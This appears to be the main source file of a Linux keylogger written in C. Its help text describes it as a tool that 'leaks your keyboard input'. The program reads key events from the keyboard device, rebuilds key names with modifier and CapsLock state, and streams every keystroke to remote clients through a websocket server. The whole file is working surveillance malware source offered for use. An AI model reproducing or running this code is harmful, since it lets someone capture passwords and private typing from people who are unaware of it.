#include <fcntl.h>
#include <getopt.h>
#include <libwebsockets.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "keylogger.h"
#include "ws.h"

static volatile sig_atomic_t keep_running = true;
static bool printk_active = false;

void print_help() {
    printf("\n");
    printf("Keylogger for Linux. Leaks your keyboard input\n");
    printf("\n");
    printf("Usage   : keylogger <options?>\n");
    printf("Options :\n");
    printf("  --dev    <path>     Specify the device event to use\n");
    printf("  --printk            Show keystrokes in terminal\n");
    printf("  --port   <uint16>   Specify WS port (default: 33300)\n");
    printf("\n");
    printf("  -h, --help          Display help message and exit\n");
    printf("\n");
}

void signal_handler(int sig) {
    (void)sig;
    keep_running = false;
}

void dispatch_output(const char *message) {
    if (!message || message[0] == '\0') return;

    if (printk_active) {
        printf("%s\n", message);
    }

    send_message_to_client(message);
}

int main(int argc, char **argv) {
    const char *target_device_name = NULL;
    uint16_t port = DEFAULT_PORT;

    struct option keylogger_options[] = {
        {"dev",    required_argument, NULL, 0  },
        {"printk", no_argument,       NULL, 0  },
        {"port",   required_argument, NULL, 0  },
        {"help",   no_argument,       NULL, 'h'},
        {0,        0,                 0,    0  }
    };

    int opt;
    int opt_index = 0;
    while ((opt = getopt_long(argc, argv, "h", keylogger_options, &opt_index)) != -1) {
        switch (opt) {
            case 'h':
                print_help();
                return EXIT_SUCCESS;
            case 0:
                if (strcmp(keylogger_options[opt_index].name, "dev") == 0) target_device_name = optarg;
                if (strcmp(keylogger_options[opt_index].name, "printk") == 0) printk_active = true;
                if (strcmp(keylogger_options[opt_index].name, "port") == 0) port = (uint16_t)strtoul(optarg, NULL, 10);
                break;
            case '?':
                fprintf(stderr, "Unknown option. Use -h or --help for help\n");
                return EXIT_FAILURE;
            default:
                fprintf(stderr, "Failed to parse options\n");
                return EXIT_FAILURE;
        }
    }

    if (init_websocket_server(port) != 0) {
        return EXIT_FAILURE;
    }

    char *keyboard_path = find_keyboard_device(target_device_name);
    if (!keyboard_path) {
        fprintf(stderr, "No keyboard device found");
        if (target_device_name) {
            fprintf(stderr, " with name: %s\n", target_device_name);
        } else {
            fprintf(stderr, " - check permissions or specify device explicitly\n");
        }
        return EXIT_FAILURE;
    }

    char *keyboard_name = get_keyboard_name(keyboard_path);
    if (keyboard_name) {
        printf("Using keyboard device: %s\n", keyboard_name);
    } else {
        printf("Using keyboard device: %s\n", keyboard_path);
    }

    int fd = open(keyboard_path, O_RDONLY);
    if (fd == -1) {
        perror("Cannot open keyboard device");
        free(keyboard_name);
        free(keyboard_path);
        return EXIT_FAILURE;
    }

    bool state_capslock_active = false;
    unsigned char led_status_bytes[(LED_MAX / 8) + 1] = {0};
    if (ioctl(fd, EVIOCGLED(sizeof(led_status_bytes)), led_status_bytes) == -1) {
        fprintf(stderr, "Failed to get CapsLock LED status\n");
    } else {
        const int byte_index = LED_CAPSL / 8;
        const int bit_shift = LED_CAPSL % 8;
        state_capslock_active = (led_status_bytes[byte_index] & (1 << bit_shift)) != 0;
    }

    struct input_event event = {0};
    bool shift_pressed = false, ctrl_pressed = false, meta_pressed = false, alt_pressed = false;

    signal(SIGTERM, signal_handler);
    signal(SIGINT, signal_handler);

    char output_buffer[MAX_KEY_LEN] = {0};

    while (keep_running) {
        lws_service(context, 0);

        ssize_t bytes_read = read(fd, &event, sizeof(event));
        if (bytes_read != sizeof(event)) {
            if (bytes_read == -1) break;
            continue;
        }

        if (event.type != EV_KEY) continue;

        switch (event.code) {
            case KEY_LEFTSHIFT:
            case KEY_RIGHTSHIFT:
                shift_pressed = (event.value != 0);
                break;
            case KEY_LEFTCTRL:
            case KEY_RIGHTCTRL:
                ctrl_pressed = (event.value != 0);
                break;
            case KEY_LEFTMETA:
            case KEY_RIGHTMETA:
                meta_pressed = (event.value != 0);
                break;
            case KEY_LEFTALT:
            case KEY_RIGHTALT:
                alt_pressed = (event.value != 0);
                break;
        }

        if (event.value == 1) {
            output_buffer[0] = '\0';
            const char *key_name = NULL;
            switch (event.code) {
                case KEY_LEFTSHIFT:
                case KEY_RIGHTSHIFT:
                    strcpy(output_buffer, "Shift");
                    break;
                case KEY_LEFTCTRL:
                case KEY_RIGHTCTRL:
                    strcpy(output_buffer, "Ctrl");
                    break;
                case KEY_LEFTMETA:
                case KEY_RIGHTMETA:
                    strcpy(output_buffer, "Meta");
                    break;
                case KEY_LEFTALT:
                case KEY_RIGHTALT:
                    strcpy(output_buffer, "Alt");
                    break;
                case KEY_CAPSLOCK:
                    state_capslock_active = !state_capslock_active;
                    strcpy(output_buffer, state_capslock_active ? "CapsLock On" : "CapsLock Off");
                    break;
                default:
                    key_name = get_key_name(event.code, shift_pressed, state_capslock_active);
                    if (strcmp(key_name, "UNKNOWN") != 0) {
                        snprintf(output_buffer, sizeof(output_buffer), "%s%s%s%s", ctrl_pressed ? "Ctrl+" : "",
                                 meta_pressed ? "Meta+" : "", alt_pressed ? "Alt+" : "", key_name);
                    }
                    break;
            }

            dispatch_output(output_buffer);
        }
    }

    close(fd);

    free(keyboard_path);
    free(keyboard_name);

    destroy_websocket_server();

    return EXIT_SUCCESS;
}
